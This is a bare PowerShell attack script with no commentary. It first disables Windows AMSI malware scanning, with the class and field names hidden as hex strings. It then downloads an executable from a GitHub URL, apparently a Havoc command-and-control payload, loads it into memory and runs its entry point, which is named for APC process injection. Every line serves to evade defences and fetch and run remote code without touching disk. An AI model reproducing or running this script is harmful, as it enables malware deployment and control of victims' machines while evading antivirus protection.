# AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)

$bytes = (Invoke-WebRequest -useb "https://github.com/chr0n1k/AL2021/blob/main/program1_donutf7_havoc.exe?raw=true").Content;
$assembly = [System.Reflection.Assembly]::Load($bytes);
$entryPointMethod = $assembly.GetType('QUserAPCProcessInjection.Program', [Reflection.BindingFlags] 'Public, NonPublic').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic');
$entryPointMethod.Invoke($null, (, [string[]] ('', '')));
